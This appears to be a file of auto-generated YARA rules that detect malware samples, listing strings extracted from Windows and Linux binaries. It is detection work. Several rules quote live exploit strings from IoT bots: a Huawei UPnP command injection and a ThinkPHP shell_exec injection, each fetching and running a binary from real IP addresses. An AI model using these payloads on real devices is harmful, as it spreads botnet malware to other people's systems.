rule Windows_9aaa8c778af26767dd8b2f1134a119c3e9c9d27c4385810c238d350190c7e401{
    meta:
        description = "Auto ML: 9aaa8c778af26767dd8b2f1134a119c3e9c9d27c4385810c238d350190c7e401"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "\\Microsoft\\Network\\Connections"
        $s3 = "https://clfeed.online/keyfileupdate/rst32.jpg"
        $s4 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $s5 = "v4.0.30319"
        $s6 = "Microsoft.Win32"
        $s7 = "System.IO"
        $s8 = "HttpWebResponse"
        $s9 = "ConsoleApp1.exe"
        $s10 = "System.Threading"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10KB
        and all of them
}

rule Windows_0fc292968815c4c7e58f76fec1193c36400977d3dae10d42ccda83ec5c14c9d0{
    meta:
        description = "Auto ML: 0fc292968815c4c7e58f76fec1193c36400977d3dae10d42ccda83ec5c14c9d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "kernel32.dll"
        $s7 = "m/d/yy"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8028KB
        and all of them
}

rule Windows_9ab71d8aeef723a7e6eb9587b05b9a5a2d5663ff760820deec1016e3b5c47cf4{
    meta:
        description = "Auto ML: 9ab71d8aeef723a7e6eb9587b05b9a5a2d5663ff760820deec1016e3b5c47cf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "B.idata"
        $s2 = ".rsrc"
        $s3 = ".boot"
        $s4 = ".IJmD"
        $s5 = "1Ug\\M"
        $s6 = "O..Ml"
        $s7 = "Nl0.D"
        $s8 = "qcQ\\5"
        $s9 = "\\MyYW"
        $s10 = "\\dxe7"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3362KB
        and all of them
}

rule Windows_9acdb4684a7653fe85b32281195f2d1af944142f6001c38f6793f099dd0f997c{
    meta:
        description = "Auto ML: 9acdb4684a7653fe85b32281195f2d1af944142f6001c38f6793f099dd0f997c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.IO"
        $s4 = "System.Data"
        $s5 = "AKNcyXnx.exe"
        $s6 = "System.Runtime.Versioning"
        $s7 = "System.Drawing"
        $s8 = "System.ComponentModel"
        $s9 = "System.Configuration"
        $s10 = "System.Globalization"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 897KB
        and all of them
}

rule Windows_9ae1049e0579fd8ef08a03d050571ff770d1c8957ddbf210e3257dd88e08c23d{
    meta:
        description = "Auto ML: 9ae1049e0579fd8ef08a03d050571ff770d1c8957ddbf210e3257dd88e08c23d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "m/d/yy"
        $s7 = "kernel32.dll"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4009KB
        and all of them
}

rule Linux_9ae234670945c73560b0657fb56b460ba43e2c5f3f22c8d23ce31282fcebe9da{
    meta:
        description = "Auto ML: 9ae234670945c73560b0657fb56b460ba43e2c5f3f22c8d23ce31282fcebe9da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/BQxHoQxB"
        $s2 = "HoQl/"
        $s3 = "NuNq/"
        $s4 = "HTTP/1.1"
        $s5 = "FTPjGNRGP\""
        $s6 = ".shstrtab"
        $s7 = ".init"
        $s8 = ".text"
        $s9 = ".fini"
        $s10 = ".rodata"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Linux_9afb075e67fe444d1b21264917f57c74b90784d3ef938d7f8a03ef0f6c4ee908{
    meta:
        description = "Auto ML: 9afb075e67fe444d1b21264917f57c74b90784d3ef938d7f8a03ef0f6c4ee908"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/bin/sh"
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s3 = "x2F/x2B/x32/x33/x3D/x2F/x3C/x7D/x70/x22/x3F/x28/x27/x20/x2E/x30/x74/x3F/x74/x23/x72/x70/x35/x33/x36/x26/x74/x2C/x31/x2D/x75/x2F/x2B/x21/x7D/x3D/x2B/x37/x33/x32/x70/x21/x36/x2B/x32/x2D/x3F/x3F/x2C/x71/x32/x36/x2B/x3F/x74/x30/x27/x34/x28/x26/x2B/x36/x21/x35/x36/x2B/x7D/x7D/x73/x72/x2B/x33/x24/x75/x26/x2F/x37/x22/x70/x24/x31/x36/x76/x72/x32/x35/x76/x70/x75/x35/x21/x20/x2A/x2C/x76/x20/x74/x21/x75/x2A/x28/x37/x33/x76/x34/x71/x2E/x77/x26/x72/x27/x2F/x2F/x30/x2B/x27/x74/x30/x3F/x26/x2B/x34/x29/x75/x2C/x23/x7C/x21/x77/x31/x29/x76/x21/x74/x23/x2F/x37/x20/x73/x3F/x30/x30/x2D/x3D/x29/x22/x26/x72/x31/x24/x45"
        $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $s5 = "%s /%s HTTP/1.1"
        $s6 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s7 = "/proc/net/route"
        $s8 = "/usr/bin/python"
        $s9 = "/usr/sbin/dropbear"
        $s10 = "Input/output error"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB
        and all of them
}

rule Windows_9b631808752d97a24c25c81b99a8739ff79b3a5689aeb4e5e9a9068d155e8009{
    meta:
        description = "Auto ML: 9b631808752d97a24c25c81b99a8739ff79b3a5689aeb4e5e9a9068d155e8009"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".pdata"
        $s3 = "A84.u"
        $s4 = "MM/dd/yy"
        $s5 = "C:\\Work\\Excel-DNA\\ExcelDna\\Source\\ExcelDna\\x64\\Release\\ExcelDna64.pdb"
        $s6 = ".00cfg"
        $s7 = ".rdata"
        $s8 = ".xdata"
        $s9 = ".edata"
        $s10 = ".data"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1062KB
        and all of them
}

rule Linux_9b6ca9302542ce0c4a7c4990b8cdce4c9e441c5ced457fc70f0746bf11ae3b84{
    meta:
        description = "Auto ML: 9b6ca9302542ce0c4a7c4990b8cdce4c9e441c5ced457fc70f0746bf11ae3b84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/bin/sh"
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s3 = "x2F/x2B/x32/x33/x3D/x2F/x3C/x7D/x70/x22/x3F/x28/x27/x20/x2E/x30/x74/x3F/x74/x23/x72/x70/x35/x33/x36/x26/x74/x2C/x31/x2D/x75/x2F/x2B/x21/x7D/x3D/x2B/x37/x33/x32/x70/x21/x36/x2B/x32/x2D/x3F/x3F/x2C/x71/x32/x36/x2B/x3F/x74/x30/x27/x34/x28/x26/x2B/x36/x21/x35/x36/x2B/x7D/x7D/x73/x72/x2B/x33/x24/x75/x26/x2F/x37/x22/x70/x24/x31/x36/x76/x72/x32/x35/x76/x70/x75/x35/x21/x20/x2A/x2C/x76/x20/x74/x21/x75/x2A/x28/x37/x33/x76/x34/x71/x2E/x77/x26/x72/x27/x2F/x2F/x30/x2B/x27/x74/x30/x3F/x26/x2B/x34/x29/x75/x2C/x23/x7C/x21/x77/x31/x29/x76/x21/x74/x23/x2F/x37/x20/x73/x3F/x30/x30/x2D/x3D/x29/x22/x26/x72/x31/x24/x45"
        $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $s5 = "%s /%s HTTP/1.1"
        $s6 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s7 = "/proc/net/route"
        $s8 = "/usr/bin/python"
        $s9 = "/usr/sbin/dropbear"
        $s10 = "Input/output error"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB
        and all of them
}

rule Windows_9b7e70464f16dfdd9a7a84ff0f800de46c8f9a791da677e3abc1c4fbab2d7b59{
    meta:
        description = "Auto ML: 9b7e70464f16dfdd9a7a84ff0f800de46c8f9a791da677e3abc1c4fbab2d7b59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "B.rsrc"
        $s3 = "/.ffefefeeffe"
        $s4 = "v2.0.50727"
        $s5 = "NanoCore Client.exe"
        $s6 = "Microsoft.VisualBasic"
        $s7 = "System.Windows.Forms"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_9b916aa3c1b65d602687cee9bdf576ec4c9d163f4481a96ca7d5be486433e09b{
    meta:
        description = "Auto ML: 9b916aa3c1b65d602687cee9bdf576ec4c9d163f4481a96ca7d5be486433e09b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.Drawing.Drawing2D"
        $s4 = "System.IO"
        $s5 = "System.Xml.Schema"
        $s6 = "System.Data"
        $s7 = "System.Collections.Generic"
        $s8 = "yjcT.exe"
        $s9 = "System.Threading"
        $s10 = "System.Drawing.Imaging"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2148KB
        and all of them
}

rule Linux_9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6{
    meta:
        description = "Auto ML: 9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "QJD.QJ"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 2.58.113.120 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "Accept: /"
        $s6 = "User-Agent: Uirusu/2.0"
        $s7 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s8 = "Host: 192.168.0.14:80"
        $s9 = "User-Agent: python-requests/2.20.0"
        $s10 = "Content-Type: application/x-www-form-urlencoded"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 76KB
        and all of them
}

rule Windows_011c45deea7f50338e56529fb8705caa6e86b3920e7f4f79926bcb7933ffa0ba{
    meta:
        description = "Auto ML: 011c45deea7f50338e56529fb8705caa6e86b3920e7f4f79926bcb7933ffa0ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".idata"
        $s3 = "advapi32.dll"
        $s4 = "setupx.dll"
        $s5 = "setupapi.dll"
        $s6 = "advpack.dll"
        $s7 = "wininit.ini"
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s9 = "msdownld.tmp"
        $s10 = "Control Panel\\Desktop\\ResourceLocale"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB
        and all of them
}

rule Windows_0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af{
    meta:
        description = "Auto ML: 0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "pis.pdf.exe"
        $s4 = "ik.PowerShell"
        $s5 = "System.Management.Automation"
        $s6 = "System.Management.Automation.Host"
        $s7 = "System.Windows.Forms"
        $s8 = "System.Text"
        $s9 = ".ctor"
        $s10 = "System.Collections.ObjectModel"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 211KB
        and all of them
}

rule Windows_9bf63272d2a6c62609953b695956eaed4a5496159dc17dd9617d9f1bd37e0be9{
    meta:
        description = "Auto ML: 9bf63272d2a6c62609953b695956eaed4a5496159dc17dd9617d9f1bd37e0be9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "kernel32.dll"
        $s7 = "m/d/yy"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6256KB
        and all of them
}

rule Windows_9c6536ae2b9588bf5dada49dc918a668a204e0903fc091bf1a5ebaacb9b5559f{
    meta:
        description = "Auto ML: 9c6536ae2b9588bf5dada49dc918a668a204e0903fc091bf1a5ebaacb9b5559f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "j\\Yf9"
        $s4 = "j\\Xf9F"
        $s5 = "f99t7SVj."
        $s6 = "/hpmL"
        $s7 = "u\\PPRj"
        $s8 = "kernel32.dll"
        $s9 = "MM/dd/yy"
        $s10 = "AiFC."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1208KB
        and all of them
}

rule Windows_9c6d3d24482d750aa59531f45f94824231335167787b248ac5a4cad5e3bb387e{
    meta:
        description = "Auto ML: 9c6d3d24482d750aa59531f45f94824231335167787b248ac5a4cad5e3bb387e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "m/d/yy"
        $s7 = "kernel32.dll"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4700KB
        and all of them
}

rule Windows_9c7844e137bd630f22e7d487c43be450d9c185ea7339230bef46d2decb817d4d{
    meta:
        description = "Auto ML: 9c7844e137bd630f22e7d487c43be450d9c185ea7339230bef46d2decb817d4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".idata"
        $s3 = "advapi32.dll"
        $s4 = "setupx.dll"
        $s5 = "setupapi.dll"
        $s6 = "advpack.dll"
        $s7 = "wininit.ini"
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s9 = "msdownld.tmp"
        $s10 = "Control Panel\\Desktop\\ResourceLocale"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6341KB
        and all of them
}

rule Windows_9c98f0f798b53d28919e7c8f7331619c509e24045d1f4dd192f86f2a6115d483{
    meta:
        description = "Auto ML: 9c98f0f798b53d28919e7c8f7331619c509e24045d1f4dd192f86f2a6115d483"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".paci"
        $s3 = ".rsrc"
        $s4 = "F\\8yB"
        $s5 = "F0Pj."
        $s6 = "F4Pj/"
        $s7 = "FTPjK"
        $s8 = "F\\PjM"
        $s9 = "FtPj;"
        $s10 = "C.PjRV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Linux_9cc3f85bf7ed1c4470c3b21f0b4c74ecd5520d5365952400983c9b6031c9e20f{
    meta:
        description = "Auto ML: 9cc3f85bf7ed1c4470c3b21f0b4c74ecd5520d5365952400983c9b6031c9e20f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".a mqd"
        $s2 = "/DrWB\\"
        $s3 = "99fd\\"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "wfb_.i/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_9cd9f4e29036513f892a86b7bf96dfd7fc9815c12ca23eb81ca0b4c6926fa235{
    meta:
        description = "Auto ML: 9cd9f4e29036513f892a86b7bf96dfd7fc9815c12ca23eb81ca0b4c6926fa235"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "_cfj_:/"
        $s3 = "iYoU/"
        $s4 = "v4.0.30319"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = ".ctor"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Runtime.Versioning"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6345KB
        and all of them
}

rule Linux_9d39be5e762c98d20fb5de96615e2935d011a14d37fad8334bcab76b2293bcfd{
    meta:
        description = "Auto ML: 9d39be5e762c98d20fb5de96615e2935d011a14d37fad8334bcab76b2293bcfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "/proc/self"
        $s4 = "/proc/self/cmdline"
        $s5 = "/dev/watchdog"
        $s6 = "/dev/misc/watchdog"
        $s7 = "/sbin/watchdog"
        $s8 = "/dev/FTWDT101_watchdog"
        $s9 = "/dev/FTWDT101/watchdog"
        $s10 = "/dev/watchdog0"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

rule Linux_9d758c942e12cc5939473e7fb9f57482e3888494aeaae4f7ba353f3c282f24cf{
    meta:
        description = "Auto ML: 9d758c942e12cc5939473e7fb9f57482e3888494aeaae4f7ba353f3c282f24cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "YRRj.W"
        $s2 = "/bin/sh"
